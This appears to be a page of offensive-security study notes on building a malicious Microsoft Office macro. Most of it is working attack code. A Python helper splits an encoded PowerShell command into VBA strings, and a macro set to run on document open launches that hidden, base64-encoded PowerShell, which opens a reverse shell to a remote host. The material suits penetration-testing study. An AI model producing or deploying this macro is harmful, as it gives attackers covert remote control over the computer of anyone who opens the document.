---
description: >-
  Credit:
  https://cel1s0.gitbook.io/offsec-notes/readme/windows/office-macro/microsoft-office
---

# Microsoft Office

Choose VIEW ribbon and selecting Macros option. We type name for the macro and in the MACROS in drop-down menu, select the name of document, then the macro will be add. When we click create, a simple macro framework will be add into our document. We have to save the document as either .docm or the older .doc format. They support embedded macros, .docx format does not.

{% embed url="https://www.revshells.com/" %}

![](<../../../.gitbook/assets/image (10).png>)

We have to edit the payload. We change related part of payload variable.&#x20;

```python
#!/usr/bin/python

payload = "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad..."

n=50

for i in range(0, len(payload), n):
	print "Str = Str + " + '"' + payload[i:i+n] + '"'
```

```vba
Sub AutoOpen()
    Evil
End Sub

Sub Document_Open()
    Evil
End Sub
s
Sub Evil()
    Dim Str As String
    Str = Str + "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad"
    Str = Str + "AAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdAB"
    Str = Str + "lAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDA"
    Str = Str + "GwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxACI"
    Str = Str + "ALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAa"
    Str = Str + "QBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB"
    Str = Str + "5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2A"
    Str = Str + "DUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGk"
    Str = Str + "AIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAe"
    Str = Str + "QB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgB"
    Str = Str + "nAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhA"
    Str = Str + "CAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHA"
    Str = Str + "AZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQ"
    Str = Str + "QBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB"
    Str = Str + "0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApA"
    Str = Str + "DsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQ"
    Str = Str + "AZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAc"
    Str = Str + "gBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQA"
    Str = Str + "gACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgA"
    Str = Str + "CsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACI"
    Str = Str + "AOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAd"
    Str = Str + "AAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQA"
    Str = Str + "uAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrA"
    Str = Str + "DIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHM"
    Str = Str + "AZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZ"
    Str = Str + "QAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgB"
    Str = Str + "sAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvA"
    Str = Str + "HMAZQAoACkA"
    CreateObject("Wscript.Shell").Run Str
End Sub
```
